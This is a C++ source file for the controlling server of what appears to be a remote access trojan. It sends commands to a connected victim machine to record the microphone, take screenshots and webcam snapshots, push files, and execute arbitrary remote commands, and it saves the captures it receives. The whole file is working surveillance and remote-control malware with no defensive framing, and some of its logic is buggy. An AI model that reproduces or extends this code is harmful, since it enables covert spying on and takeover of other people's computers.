/*
	Command:	Download <file>: Receive a file from server
				Mic: Record microphone and send to server
				Screenshoot: Take a client screenshoot and send to server
				Camera: Take a client webcam snapshot and send to server
				Remote <command>: Execute command on client machine
*/


#include "Header.h"

int main(int argc, char* argv[]) {
	WSADATA wsaData;
	SOCKET clientSocket = INVALID_SOCKET;
	SOCKET listenSocket = INVALID_SOCKET;
	addrinfo* result = NULL;
	addrinfo hints;

	int iResult;
	string input, command, option;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("[ERROR] WSAStartup. %d\n", WSAGetLastError());
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	iResult = GetAddrInfo(NULL, PORT, &hints, &result);
	if (iResult != 0) {
		printf("[ERROR] GetAddrInfo. %d\n", WSAGetLastError());
		WSACleanup();
		return 2;
	}

	listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (listenSocket == INVALID_SOCKET) {
		printf("[ERROR] create socket. %d\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 3;
	}

	iResult = bind(listenSocket, result->ai_addr, result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("[ERROR] bind. %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(listenSocket);
		WSACleanup();
		return 4;
	}

	freeaddrinfo(result);

	iResult = listen(listenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("[ERROR] listen. %d\n", WSAGetLastError());
		closesocket(listenSocket);
		WSACleanup();
		return 5;
	}

	clientSocket = accept(listenSocket, NULL, NULL);
	if (clientSocket == INVALID_SOCKET) {
		printf("[ERROR] accept. %d\n", WSAGetLastError());
		closesocket(listenSocket);
		WSACleanup();
		return 6;
	}

	printf("[NOTICE] Client connected with port %s\n", PORT);
	closesocket(listenSocket);



	do {
		input = "";
		command = "";
		option = "";

		printf("[INPUT] Enter command: ");
		getline(cin, input);

		// get command
		BOOL isOption = FALSE;
		for (int i = 0; i < input.size(); i++) {
			if (isOption) {
				option.push_back(input[i]);
			}
			else {
				if (input[i] == ' ' || input[i] == '\0') {
					isOption = TRUE;
					continue;
				}
				command.push_back(input[i]);
			}
		}

		if (command.empty())continue;

		// send command
		iResult = send(clientSocket, command.c_str(), command.size(), 0);
		if (iResult > 0) {
			printf("[OK] Command sent: %d\n", iResult);
		}
		else if (iResult < 0) {
			printf("[ERROR] recv. %d\n", WSAGetLastError());
			closesocket(clientSocket);
			WSACleanup();
			return 8;
		}


		if (command.compare("Quit") == 0) {
			break;
		}

		if (command.compare("Download") == 0) {
			//Download Function - Send file to client.
			sendFile(option.c_str(), clientSocket);
		}

		if (command.compare("Mic") == 0) {
			//Receive client's micro recording.
			receiveFile("Recording", clientSocket);
		}

		if (command.compare("Screenshot") == 0) {
			//Receive client's screenshot.
			receiveFile("Screenshot", clientSocket);
		}

		if (command.compare("Camera") == 0) {
			//Receive client's camera picture.
			receiveFile("Camera", clientSocket);
		}

		if (command.compare("Remote") == 0) {
			//Send remote command
			iResult = send(clientSocket, option.c_str(), option.size(), 0);
			if (iResult > 0) {
				//Receive command output.
				char* recvBuffer = NULL;
				do {
					recvBuffer = (char*)calloc(BUFSIZ, sizeof(char));
					if (recvBuffer) {
						iResult = recv(clientSocket, recvBuffer, BUFSIZ, 0);
						if (iResult <= 0) {
							printf("[ERROR] recv file. %d\n", WSAGetLastError());
							free(recvBuffer);
							break;
						}
						printf(recvBuffer);
						free(recvBuffer);

					}
				} while (iResult > 0);
			}
		}


	} while (1);

	printf("[NOTICE] Shutting down.\n");
	iResult = shutdown(clientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("[ERROR] shutdown. %d\n", WSAGetLastError());
		closesocket(clientSocket);
		WSACleanup();
		return 9;
	}

	// cleanup
	closesocket(clientSocket);
	WSACleanup();

	return 0;
}

void sendFile(const char* filePath, SOCKET clientSocket) {
	HANDLE file = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("[ERROR] open file. %d\n", GetLastError());
		return;
	}
	else {
		DWORD dwByteRead = 0;
		char* buffer = (char*)calloc(BUFSIZ, sizeof(char));

		// send file content
		if (buffer) {
			do {
				if (ReadFile(file, buffer, BUFSIZ, &dwByteRead, NULL) == FALSE) {
					printf("[ERROR] read file. %d\n", GetLastError());
					break;
				}
				int iSendFile = send(clientSocket, buffer, dwByteRead, 0);
				if (iSendFile != dwByteRead) {
					printf("[ERROR] send file. %d\n", WSAGetLastError());
					break;
				}
			} while (dwByteRead > 0);
		}
		CloseHandle(file);
	}
}

void receiveFile(const char* fileType, SOCKET clientSocket) {
	char* buffer = NULL;
	HANDLE file = NULL;
	int iResult = 0;
	DWORD dwByteWritten = 0;

	time_t t = time(0);
	char* now = ctime(&t);

	string fileName = "";
	fileName += fileType;
	fileName += "-";
	fileName += now;

	if (strncmp(fileType, "Recording", strlen(fileType) == 0)) {
		fileName += ".mp3";
	}
	if (strncmp(fileType, "Screenshot", strlen(fileType) == 0)) {
		fileName += ".jpg";
	}
	if (strncmp(fileType, "Camera", strlen(fileType) == 0)) {
		fileName += ".jpg";
	}

	do {
		buffer = (char*)calloc(BUFSIZ, sizeof(char));
		if (buffer) {
			iResult = recv(clientSocket, buffer, BUFSIZ, 0);
			if (iResult <= 0) {
				printf("[ERROR] recv file. %d\n", WSAGetLastError());
				free(buffer);
				return;
			}

			file = CreateFile(fileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			if (file != INVALID_HANDLE_VALUE) {
				WriteFile(file, buffer, iResult, &dwByteWritten, NULL);
				CloseHandle(file);
			}
			free(buffer);
		}
	} while (iResult > 0);
}